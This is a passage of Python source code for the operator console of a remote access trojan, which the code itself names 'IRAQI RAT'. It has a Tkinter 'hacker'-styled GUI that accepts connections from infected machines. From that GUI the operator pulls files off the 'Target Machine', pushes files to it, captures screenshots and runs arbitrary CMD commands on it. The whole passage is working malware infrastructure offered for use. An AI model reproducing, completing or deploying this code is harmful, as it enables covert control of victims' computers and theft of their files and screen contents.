        command=lambda: self.download_file(file_name_entry.get(), download_window),
        style="Hacker.TButton"
    ).pack(pady=20)
        
    def download_file(self, file_name, window):
        if file_name:
            selected_client = self.get_selected_client()
            if selected_client:
                def download_thread():
                    self.log(f"Downloading file: {file_name}")
                    selected_client.send(f"DOWNLOAD {file_name}".encode())
                    with open(file_name, 'ab') as f:
                        while True:
                            data = selected_client.recv(BUFFER_SIZE)
                            if 'SUCCESS'.encode() in data:
                                self.log(f'File ==> {file_name} Downloaded Successfully.')
                                f.close()
                                window.destroy()
                                break
                            elif 'NOT_FOUND'.encode() in data:
                                self.log(f'({file_name}) File Was Not Found On Target Machine.')
                                f.close()
                                window.destroy()
                                break
                            elif 'ERROR'.encode() in data:
                                self.log(f'Error While Downloading ==> {file_name}')
                                f.close()
                                window.destroy()
                                break
                            f.write(data)
                self.create_and_start_thread(download_thread, f"file_download_{random.randint(1000, 9999)}")
        else:
            showerror("Error", "File name cannot be empty.")
            return

    def upload_file(self):
        file_path = filedialog.asksaveasfilename()
        if file_path:
            selected_client = self.get_selected_client()
            if selected_client:
                def upload_thread():
                    try:
                        self.log(f"Uploading {file_path}...")
                        selected_client.send(f"UPLOAD {file_path}".encode())
                        with open(file_path, 'rb') as f:
                            while True:
                                data = f.read(BUFFER_SIZE)
                                if not data:
                                    selected_client.send('SUCCESS'.encode())
                                    break
                                selected_client.send(data)
                        self.log("Upload completed successfully")
                    except Exception as e:
                        self.log(f"Upload error: {e}")
                
                self.create_and_start_thread(upload_thread, f"file_upload_{random.randint(1000, 9999)}")
                        
    def take_screenshot(self):
        selected_client = self.get_selected_client()
        if selected_client:
            def take_screen():
                self.log("Taking screenshot...")
                random_name = ''.join(random.choices(string.ascii_lowercase, k=6))
                selected_client.send(f"TAKE_SCREENSHOT {random_name}".encode())
                with open(f'{random_name}.png', 'ab') as pic:
                    while True:
                        data = selected_client.recv(BUFFER_SIZE)
                        if 'SUCCESS'.encode() in data:
                            self.log(f'Screenshot saved as {random_name}.png')
                            pic.close()
                            break
                        pic.write(data)
            thread_name = threading.current_thread().name
            if thread_name in self.running_threads:
                del self.running_threads[thread_name]
            self.create_and_start_thread(take_screen, f"screen_share_{random.randint(1000, 9999)}")


    def send_custom_command(self):
        selected_client = self.get_selected_client()
        if selected_client:
            dialog = tk.Toplevel(self.root)
            dialog.title("Send Custom Command")
            dialog.geometry("500x200")
            dialog.configure(bg=self.colors["bg_dark"])
            
            tk.Label(
                dialog,
                text="Enter CMD Command:",
                font=("Courier", 10),
                fg=self.colors["terminal_green"],
                bg=self.colors["bg_dark"]
            ).pack(pady=10)
            
            cmd_entry = tk.Entry(
                dialog,
                font=("Courier", 10),
                bg=self.colors["bg_medium"],
                fg=self.colors["terminal_green"],
                insertbackground=self.colors["terminal_green"],
                width=50
            )
            cmd_entry.pack(pady=10, padx=20)

            def execute_command():
                command = cmd_entry.get()
                if command:
                    def command_thread():
                        try:
                            self.log(f"Sending command: {command}")
                            selected_client.send(f"CMD_EXEC {command}".encode())
                            output = selected_client.recv(BUFFER_SIZE)
                            if not output:
                                print(f'Not output: {output}')
                                return
                            elif 'FOLDER_ERROR'.encode() in output:
                                self.log('Folder Was Not Found On Target Machine.')
                            self.log(f"Command output:\n{output.decode()}")
                        except Exception as e:
                            print(output)
                            self.log(f"Command execution error: {e}")
                    
                    self.create_and_start_thread(
                        command_thread,
                        f"custom_command_{random.randint(1000, 9999)}"
                    )
                    dialog.destroy()
            ttk.Button(
            dialog,
            text="[ EXECUTE ]",
            command=execute_command,
            style="Hacker.TButton"
        ).pack(pady=20)
        

            
    def disconnect_client(self):
        selected_client = self.get_selected_client()
        if selected_client:
            def disconnect():
                self.log("Disconnecting client...")
                selected_client.send(b"DISCONNECT")
                self.remove_client(selected_client)
            self.create_and_start_thread(disconnect, f"disconnect_client_{random.randint(1000, 9999)}")

    def get_selected_client(self):
        selection = self.client_list.curselection()
        if selection:
            index = selection[0]
            return conns[index]
        return None

    def remove_client(self, client_socket):
        try:
            index = conns.index(client_socket)
            conns.remove(client_socket)
            clients.remove(client_socket.getpeername()[0])
            names.pop(index)
            self.client_list.delete(index)
            self.log(f"Client removed: {names[index]}")
        except:
            self.log("Error removing client")

    def display_client_actions(self, event):
        selection = self.client_list.curselection()
        if selection:
            index = selection[0]
            client_name = names[index]
            self.log(f"Selected client: {client_name}")

def accept_clients():
    while True:
        try:
            client_socket, address = server_socket.accept()
            computername = client_socket.recv(BUFFER_SIZE).decode()
            names.append(computername)
            conns.append(client_socket)
            clients.append(address[0])
            app.client_list.insert(tk.END, f"{computername} | {address[0]}")
            app.log(f"New connection from {address[0]} ({computername})")
        except Exception as e:
            print(f"Error accepting client: {e}")
            break
            
if __name__ == "__main__":
    showwarning(title='Important Notice', message='This is the first version of the IRAQI RAT. You may encounter bugs or issues. Please report any problems for future improvements.\nInstagram: apkaless')
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind(SERVER_ADDRESS)
    server_socket.listen(10)
    root = tk.Tk()
    app = Rat(root)
    
    threading.Thread(target=accept_clients, daemon=True).start()
    
    root.mainloop()
    
    for conn in conns:
        try:
            conn.close()
        except:
            pass
    server_socket.close()